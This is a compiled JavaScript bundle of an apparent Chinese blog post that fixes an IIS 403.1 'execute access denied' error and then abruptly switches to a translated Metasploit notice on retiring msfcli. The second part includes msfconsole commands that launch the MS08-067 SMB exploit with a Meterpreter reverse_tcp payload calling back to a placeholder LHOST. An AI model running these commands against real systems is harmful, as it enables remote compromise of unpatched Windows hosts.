(window.webpackJsonp=window.webpackJsonp||[]).push([[242],{533:function(s,t,a){"use strict";a.r(t);var e=a(7),n=Object(e.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"http-错误-403-1-禁止访问-执行访问被拒绝"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#http-错误-403-1-禁止访问-执行访问被拒绝"}},[s._v("#")]),s._v(" HTTP 错误 403.1 - 禁止访问：执行访问被拒绝")]),s._v(" "),t("p",[s._v("使用WIN2003 INTERNET信息服务（IIS）管理器，在建立一个网站虚拟目录，结果浏览网页时出现错误，错误提示信息如下：")]),s._v(" "),t("p",[s._v("该页无法显示")]),s._v(" "),t("p",[s._v("您试图从目录中执行 CGI、ISAPI 或其他可执行程序，但该目录不允许执行程序。")]),s._v(" "),t("p",[s._v("请尝试以下操作：")]),s._v(" "),t("p",[s._v("如果您认为该目录应该允许执行访问权限，请与网站管理员联系。")]),s._v(" "),t("p",[s._v("HTTP 错误 403.1 - 禁止访问：执行访问被拒绝。")]),s._v(" "),t("p",[s._v("Internet 信息服务 (IIS)")]),s._v(" "),t("p",[s._v("技术信息（为技术支持人员提供）")]),s._v(" "),t("p",[s._v("转到 Microsoft 产品支持服务并搜索包括“HTTP”和“403”的标题。\n打开“IIS 帮助”（可在 IIS 管理器 (inetmgr) 中访问），然后搜索标题为“配置 ISAPI 扩展”、“配置 CGI 应用程序”、“使用网站权限保护站点”和“关于自定义错误消息”的主题。\n在 IIS 软件开发工具包 (SDK) 或 MSDN Online Library 中，搜索标题为“Developing ISAPI Extensions”、“ISAPI and CGI”和“Debugging ISAPI Extensions and Filters”的主题。")]),s._v(" "),t("p",[s._v("经过调试，发觉解决办法其实很简单。解决办法如下：")]),s._v(" "),t("p",[s._v("单击操作系统的开始－－程序－－管理工具－－Interneter服务器管理，在IIS中选择您的站点然后右键－－属性，在“主目录”选项中，查看“执行权限”是否设置为“无”，这里改成“纯脚本”保存即可。")]),s._v(" "),t("p",[s._v("新建网站的时候忘记纯脚本选项的msfcli 不能使用?")]),s._v(" "),t("p",[s._v("msfcli 不能使用，在新版metasploit不再有效。以下翻译自Metasploit 官网。")]),s._v(" "),t("p",[s._v("Hi, 大家好，")]),s._v(" "),t("p",[s._v("这个一月份，我们做了一份关于 Metasploit 的命令行版本接口版本 Msfcli 的声明，今天我们要对它说再见了。")]),s._v(" "),t("p",[s._v("取代 Msfcli，我们推荐你在 Msfconsole 使用 -x 选项。")]),s._v(" "),t("p",[s._v("举个例子，我们如何在一条命令中使用 MS08_067 模块。")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msfconsole "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-x")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"use exploit/windows/smb/ms08_067_netapi; set RHOST [IP]; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST [IP]; run"')]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("你也可以把它在msfconsole中分步写或者做成脚本形式 (resource scripts) 或者设置别名来简化输入。")]),s._v(" "),t("p",[s._v("下面举个例子如何在msfconsole中分步使用 MS08_067 模块。")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("use exploit/windows/smb/ms08_067_netapi\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" RHOST "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("IP"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" PAYLOAD windows/meterpreter/reverse_tcp\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" LHOST "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("IP"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nrun\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("p",[s._v("上面的命令也可以做成源脚本，然后输入以下命令使用")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msfconsole "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-r")]),s._v(" name_of_resource_script.rc\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"写在最后"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),t("blockquote",[t("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);t.default=n.exports}}]);